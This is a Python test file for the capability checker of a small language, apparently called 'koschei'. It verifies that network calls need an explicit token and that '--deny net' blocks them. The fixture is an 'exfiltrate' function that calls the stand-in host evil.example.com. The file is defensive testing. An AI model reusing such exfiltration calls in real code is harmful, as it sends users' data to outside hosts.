from __future__ import annotations

import io
import pathlib
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout

from koschei.capabilities import analyze, render, to_dict
from koschei.cli import main
from koschei.parser import parse
from koschei.semantic import ImportedModule, SemanticError, check


EXFILTRATE = """
fn exfiltrate(net: NetCaps) {
    let response = net.get("https://evil.example.com") or ""
}
"""


class CapabilityContractRegressionTests(unittest.TestCase):
    def test_local_call_without_net_token_is_rejected(self) -> None:
        program = parse(EXFILTRATE + "fn main() { exfiltrate() }")
        with self.assertRaisesRegex(SemanticError, "KS2401"):
            check(program)

    def test_string_cannot_impersonate_net_token(self) -> None:
        program = parse(
            EXFILTRATE
            + 'fn main() { exfiltrate("https://evil.example.com") }'
        )
        with self.assertRaisesRegex(SemanticError, "KS2401"):
            check(program)

    def test_imported_call_without_net_token_is_rejected(self) -> None:
        dependency = parse(EXFILTRATE)
        declaration = dependency.declarations[0]
        imported = ImportedModule(
            "attack",
            {declaration.name: declaration},
            {},
        )
        root = parse("import attack fn main() { attack.exfiltrate() }")
        with self.assertRaisesRegex(SemanticError, "KS2401"):
            check(root, {"attack": imported})

    def test_capability_function_is_never_reported_as_pure(self) -> None:
        program = parse(EXFILTRATE + 'fn main() { println("safe") }')
        check(program)
        manifest = analyze(program)
        text = render(manifest, "attack.ks")
        payload = to_dict(manifest, "attack.ks")

        self.assertTrue(manifest.has_any)
        self.assertFalse(manifest.is_exact)
        self.assertIn("net", manifest.domains())
        self.assertIn("net", payload["required_domains"])
        self.assertNotIn("saf hesaplama", text)
        self.assertIn("capability çağıran tarafından sağlanmalıdır", text)
        self.assertIn("exfiltrate", text)

    def test_deny_net_blocks_unresolved_capability_requirement(self) -> None:
        source = EXFILTRATE + 'fn main() { println("safe") }'
        with tempfile.TemporaryDirectory() as directory:
            path = pathlib.Path(directory) / "attack.ks"
            path.write_text(source, encoding="utf-8")
            output = io.StringIO()
            error = io.StringIO()
            with redirect_stdout(output), redirect_stderr(error):
                exit_code = main(["caps", str(path), "--deny", "net"])

        self.assertEqual(exit_code, 2)
        self.assertIn("reddedilen yetki alanı", error.getvalue())
        self.assertNotIn("saf hesaplama", output.getvalue())


if __name__ == "__main__":
    unittest.main()
